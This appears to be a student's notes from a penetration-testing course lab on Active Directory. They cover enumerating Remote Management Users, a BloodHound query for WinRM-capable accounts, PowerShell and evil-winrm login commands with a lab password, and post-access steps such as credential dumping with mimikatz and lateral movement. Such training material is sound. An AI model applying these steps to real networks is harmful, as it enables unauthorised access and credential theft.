
## Enumerating the Remote Management Users Group

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

## Bloodhound Custom Cypher Query
We can also utilize this custom `Cypher query` in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the `Raw Query` box at the bottom of the screen and hitting enter.

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![[Pasted image 20251004191639.png]]

### Adding the Cypher Query as a Custom Query in BloodHound
![[Pasted image 20251004191712.png]]

## Establishing WinRM Session

### From Windows

```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

### From Linux

```bash
gem install evil-winrm
evil-winrm -i 10.129.201.234 -u forend -p <password>
# or use -H <NTHash> for hash auth
```

## Typical post-access actions

1. Enumerate user and system artifacts: `whoami /priv`, scheduled tasks, services, credential files.
    
2. Dump tokens and credentials if permitted (mimikatz, secrets).
    
3. Search for sensitive files and configuration data (`web.config`, .env, backups).
    
4. Attempt lateral moves to other hosts using harvested creds/hashes.
    

## Quick commands / examples

```powershell
# Check privileges once remote
whoami /priv

# PowerView enumeration
Get-NetUser
Get-NetComputer
Get-NetLocalGroupMember -ComputerName TARGET -GroupName "Administrators"
```

## Operational notes

- WinRM often exists to allow management without local admin; still valuable for lateral movement.
    
- Add custom BloodHound query to find WinRM-capable accounts for repeated use.
    
- Use `-NoProfile`/`-ExecutionPolicy Bypass` cautiously depending on environment.
    

---

